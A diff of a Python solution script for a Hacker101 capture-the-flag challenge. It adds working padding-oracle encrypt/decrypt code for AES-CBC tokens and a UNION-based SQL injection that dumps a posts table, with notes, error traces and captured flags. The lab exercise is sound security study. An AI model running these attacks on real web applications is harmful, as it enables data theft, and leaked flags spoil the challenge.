@@ -7,13 +7,16 @@
 
     https://ctf.hacker101.com/ctf
     
-    o Open to clarify
+    o Open to check
         [x] Create links on one instance and test on new instances => nothing found, but 404
         [ ] tracking.gif (main and result page)
-        [/] Generate own links when encryption key available
-        [x] Padding oracle for encryption => got flag 2
-        [x] SQL injection in JSON field 'id'
-        [ ] Padding oracle attack to get plain-text of entry with 'id'=1
+        [/] Generate own links when encryption key available => Is already possible with encryption oracle
+        [x] Padding oracle for encrypt JSON string => got flag 2
+        [x] Padding oracle attack to get plain-text of entry with 'id'=1 using post-oracle => Only bit rubbish
+        [x] SQL injection in JSON field 'id' : Load file SQL => Could find working path
+        [~] SQL injection in JSON field 'id' : Get all columns of table
+
+
 
     o URLs
         o root /
@@ -28,9 +31,25 @@
             o Assumptions: 
                 o "post" parameter contains:
                     1. IV - Initialization vector for decryption
-                    2. Link to document / JSON-file on the server
+                    2. Link to document / JSON-file on the server => Proofed true ( id of database entry )
                         o Because: Using the link in another instances gives 404 
                         o Because: Using super-large texts is not a problem, so no option to store it in input string with (length = 216)
+
+
+            o Decoded posts
+                
+                msg_1 = "HZwzFVGo1I9!2pcW2MY9FDUJMC8!ZllTvtCbvuvzGmfgpMdjyE8JO22WDyvxL69sJ5wniHf5jcV1lnjtaP5Ud1jD9PJpQhYsV2sRyjge86Zm1UOUUEJHbToICfTa!yV9fc75MLO8Z5BpJLTIT2PmikFPsZoivnysRWx5mhJjtEgWZ2wRgdT6g944KnxDyVahP4rBxY6ZB52tLN2Udjgu1w~~"
+                plain_1 = ' {"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "3", "key": "-bk5y7Vbh9Ccy-cUCOnKvg~~"}'
+
+                msg_2 = "3Vaq6KulXC!lcCxEv9K6u0oxvzI94QtDve95c0BJfzO0v6JhieGC89ZLE8h5vF!boMC26sGhZj96M1i5nNYB2ZmVHztAXymks2DX5HV!PqwivrHVf!Fwa9NiENhBhjJnLca8GJz!Ny4Zc8ZK2wtZBMcQbCujFkEvGif4rifPaH6LNFym7p8C09uAtPQL52KMc4mUe!XGeztIStl8hyZQ7w~~"
+                plain_2 = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "4", "key": "wbrIuMEXSYeEFrNgRe5Gsw~~"}'
+
+            o Encrypted commands
+                o Dump id/title/body of all entries
+                    <base_url>?post=JWU4sne1OSp2MW-4we84CWI1xYiMqHMPd2ocYuZ1C75KDU6C4KvSlKr39JZc8bYx1GN602qbLRPOxkHWo!xiXfiZCAFb!f0vNuwVQL8awM50XfZjC5WzLVxM4-tiMD2FaweFkjbxAiwztVw2xW6FdQ~~
+
+
+
 
             o Outcoming error messages when changing url randomly
                 1. Using input string with random length:
@@ -126,24 +145,49 @@
                         raise errorvalue
                     ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
 
+                10. SQLi for DB dump output as title
+                    Attempting to decrypt page with title: ^FLAG^ef359a23d792acc6dada84b86c0dd9fe5a52390f8ca1f94f4f61a8e68514f87c$FLAG$:QRWpJgL-6zUqC5WYQ4DLYXLZQ1JATpOwxNrSmbojWNrikdz5k89n1WLpDMmMEQILgx1txEAvQLdI1sew2uAEwlQgfg3I47T1A6Aud70F!Pgk3W3PrmxemovReHyvyd1s,TestingTitle:s17wqMaSTLq-seXCQlJ0budPt0i81prDfMMEprDV8ws~,Title 1:dfbt2R1BxXTI97Nc6jAghGitIqm3LNRhPRr1brfrfZg~,Title 2:IpgUTgRRwxo7B-soFR4wFZ5PDkGC2fRjuxEyFwcmkVM~,Title 3:qDJI74ml9APySEr8Rl-V-VUKAsT9WyN1tJjSYIMcLtE~
+                    Traceback (most recent call last):
+                    File "./main.py", line 74, in index
+                        body = decryptPayload(post['key'], body)
+                    KeyError: 'key'
+
+
 """
 
-# from Crypto.Cipher import AES
+from Crypto.Cipher import AES
 # import binascii
 from helper import *
 from padding_oracle import padding_oracle_decrypt, padding_oracle_encrypt
 
 # Base url of Hacker101 challenge
-base_url = "http://35.190.155.168/e619f1987e/"
+base_url = "http://35.190.155.168/fa8e187459/"
 
 
-# Call  decryptPayload(post['key'], body):
-def decryptPayload(key, body):
+def decryptPayload(key, body, block_size):
     """Reverse engineered decrypt function from the server"""
 
-    # @todo: Nothing here yet
+    cipher_blocks = split_into_blocks(decode_data(body), block_size=block_size)
 
-    pass
+    iv = cipher_blocks[0]
+    cipher_text = "".join(cipher_blocks[1:])
+
+    cipher = AES.new(decode_data(key), AES.MODE_CBC, iv)
+
+    plain_text = unpad(cipher.decrypt(cipher_text))
+
+    return plain_text
+
+def encryptPayload(key, plain_text, iv, block_size):
+    """Reverse engineered decrypt function from the server"""
+
+    plain_text = pad(plain_text, block_size=block_size)
+
+    cipher = AES.new(decode_data(key), AES.MODE_CBC, IV=iv)
+
+    cipher_text = iv + cipher.encrypt(plain_text)
+
+    return encode_data(cipher_text)
 
 def decryptLink(data):
     """Reverse engineered decrypt function from the server"""
@@ -164,7 +208,6 @@ def decryptLink(data):
 def get_flag_0():
     """Get flag 0 by any invalid input data"""
 
-
     data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
     response = evaluate_data(data[1:], base_url=base_url)
     print("Flag 0: " + str.splitlines(response.text.encode("utf-8"))[0] )
@@ -177,10 +220,10 @@ def get_flag_1():
     data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
 
     # Run the actual padding oracle attack
-    plain_text = padding_oracle_decrypt(data, block_size, base_url=base_url)
+    plain_text = padding_oracle_decrypt(data, block_size=block_size, base_url=base_url)
     print("Flag 1: " + plain_text)
     
-    # Will return {"flag": "^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}
+    # Will return {"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}
 
 
 def get_flag_2():
@@ -188,15 +231,16 @@ def get_flag_2():
 
     block_size = 16
     data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
+    
     # Original plain text etrieved from flag 1
     
     plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
     plain_text_manipulated = '{"id": "1 "}'
 
-    response = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
+    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
+    cipher_text_encoded = encode_data(cipher_text)
 
-    print("Flag 2: " + str.splitlines(response.text.encode("utf-8"))[1] )
-
+    print("Flag 2: " + str.splitlines(evaluate_data(cipher_text_encoded , base_url=base_url ).text.encode("utf-8"))[1] )
 
 
 def get_flag_3():
@@ -207,22 +251,35 @@ def get_flag_3():
 
     # Original plain text retrieved from flag 1
     plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
-    plain_text_manipulated = '{"id": "1 AND false UNION SELECT body, body FROM posts WHERE id=1"}'
+    
+    # This is working! Get content from posts (id, title, body)
+    plain_text_manipulated = '{"id": "1 AND false UNION SELECT group_concat(id,0x3a,title,0x3a,body), \'...\' FROM posts"}'
 
-    response = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
+    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
+    cipher_text_encoded = encode_data(cipher_text)
 
+    print("cipher_text: " + cipher_text)
+    print("cipher_text_encoded: " + cipher_text_encoded)
+    response = evaluate_data(cipher_text_encoded , base_url=base_url )
     print(response.text)
 
-"""
-    Response
-    Attempting to decrypt page with title: kLjYc5Z-jKUBiVqdDrQhTyVbih1AbTNboKv!TsGChQxV!PJKXGohDjxEyVCcTEPzKBR1JvbKVBLfs-uQG!AoCEU9EDM0H6sGfJqFj7heoCEXUAczw4FsTNBIzibX5lgB
-    Traceback (most recent call last):
-    File "./main.py", line 74, in index
-        body = decryptPayload(post['key'], body)
-    KeyError: 'key'
-"""
 
+def test_en_decryptPayload():
+    """Testing reverse engineered version of payload decryption"""
 
+    # Example message Msg 2
+    key = "wbrIuMEXSYeEFrNgRe5Gsw~~"
+    body = "IpgUTgRRwxo7B-soFR4wFZ5PDkGC2fRjuxEyFwcmkVM~"
+    plain_text = "Msg #2"
+    block_size=16
+
+    # Decryption
+    if decryptPayload(key=key,body=body, block_size=block_size) != plain_text:
+        raise Exception("Error occurred! The method 'decryptPayload' does not work as expected.")
+
+        # Encryption
+    if encryptPayload(key, plain_text, iv=split_into_blocks(decode_data(body), block_size=block_size)[0], block_size=block_size) != body:
+        raise Exception("Error occurred! The method 'encryptPayload' does not work as expected.")
 
 
 if __name__ == "__main__":
@@ -230,9 +287,10 @@ if __name__ == "__main__":
     # Initial tests
     test_de_encoding()
     test_un_padding()
+    test_en_decryptPayload()
 
-    get_flag_0()
+    #get_flag_3()
+    #get_flag_0()
     #get_flag_1()
-    get_flag_2()
-    get_flag_3()
+    #get_flag_3()
 
